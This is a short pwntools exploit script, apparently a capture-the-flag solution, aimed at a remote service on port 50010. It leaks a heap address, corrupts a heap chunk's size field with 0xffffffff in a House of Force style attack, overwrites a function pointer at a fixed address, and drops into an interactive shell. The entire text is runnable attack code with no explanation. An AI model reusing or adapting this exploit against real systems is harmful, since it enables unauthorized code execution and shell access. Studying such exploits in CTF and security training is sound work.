from pwn import *
p = remote("remote.goatskin.kr",50010);

context.log_level = "debug"

payload = ""
payload2 = ""
payload3 = ""
payload4 = ""
payload += p32(1)
payload += p32(8)
p.send(payload)
heap_leak = p.recvuntil("\n").rstrip("]\n").lstrip("[")
addr = 0xffffffff + 0x0804a040 - 24 - int(heap_leak, 16) + 1
print(hex(addr))
payload2 += p32(2)
payload2 += p32(16)
payload2 += "AAAAAAAAAAAA"
payload2 += p32(0xffffffff)
p.send(payload2)
payload3 += p32(1)
payload3 += p32(addr)
p.send(payload3)
p.recvuntil("\n")
p.send(payload)
payload4 += p32(2)
payload4 += p32(4)
payload4 += p32(0x08048490)
payload4 += p32(3)
p.send(payload4)

p.interactive()
